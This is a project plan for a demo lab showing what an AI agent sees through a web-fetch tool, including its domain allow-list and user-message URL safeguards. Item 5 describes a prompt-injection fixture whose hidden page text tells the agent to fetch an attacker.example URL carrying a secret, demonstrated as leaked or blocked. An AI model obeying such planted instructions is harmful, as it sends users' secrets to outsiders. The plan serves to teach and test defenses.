# Web Fetch Lab — PLAN

**Goal:** A "paste a URL, see what your agent sees" lab for `@ai-sdk/tool-web-fetch`: raw HTML next to the Markdown the model gets, the tool's safety switches, and a mock agent showing them stop a prompt-injection leak.

Source buzz: https://x.com/aisdk/status/2113669323483128111 (@aisdk, Oct 2026). Official: https://github.com/vercel/ai/tree/main/packages/tool-web-fetch.

## Single-user MVP
1. URL bar plus Fetch: the server calls the tool's `execute` and also does a plain GET for the raw HTML. Two panes: raw HTML on the left, cleaned Markdown (title, finalUrl, contentType) on the right.
2. Token savings: an estimate for raw vs Markdown (chars/4, labelled "estimate") and the percent saved.
3. Safety switches (shadcn switches and inputs), all off by default like the tool: an allow-list (`allowedDomains`, comma-separated), "only fetch URLs from the user message" (`requireUrlInUserMessage`), and a length cap (`maxLength`, showing `nextOffset` and a "read next chunk" button when it truncates).
4. Error card showing the tool's `errorCode` and message (e.g. url_not_allowed, url_not_in_user_message).
5. Preset "Prompt injection test page": a bundled fixture whose hidden text tells the agent to fetch `https://attacker.example/leak?secret=<fake secret>`. With the switches off, the mock agent's second fetch attempt "leaks" (shown in red, never really sent). With the allow-list or user-message mode on, the tool returns an error and the leak is blocked (shown in green).
6. Chat panel: a mock model by default (scripted with `ai/test`, so no key is needed) that calls `webFetch` on URLs in your message and shows each tool call and result. If a key env var is set, a "Real model" toggle uses a real provider.

**Out of scope:** auth, saving history, streaming UI polish, browsing that runs JavaScript, deploy.

## Tasks (vertical slices)
1. Read the tool's README, docs and 1.0.0 source. Check that every pinned package is at least 3 days old. Scaffold Vite React TS (skip install), bunfig.toml, install pinned versions, shadcn init (minimalist).
2. Bun.serve server with /api/fetch and the Vite proxy; one `bun run dev` for both. Raw vs Markdown panes and the token estimate.
3. Safety switches wired to `createWebFetchTool` options, error card, and length cap with next chunk.
4. Injection fixture and the mock-agent chat showing leaked vs blocked; optional real model.
5. README, screenshot and video, PR.

## Stack
- `@ai-sdk/tool-web-fetch` 1.0.0 + `ai` 7.0.150 + `@ai-sdk/provider-utils` 5.0.67: the tech being demoed, pinned to versions past the 3-day rule.
- Bun.serve: the tool must run server-side; this is the smallest server with no extra framework.
- Vite + React + TS with a dev proxy: least wiring for a one-screen client.
- `ai/test` mock model: the demo runs without an API key.
- shadcn/ui minimalist preset (input, button, switch, card, tabs, badge, scroll-area): repo standard.

## Deferred
- `blockedDomains` mode, custom `defuddleOptions`, and side-by-side comparison of several URLs: nice to have.
- Deploy preview: the server part needs a runtime, so it comes later.
- Tests beyond the injection-blocked case and the token-estimate helper: critical logic only.
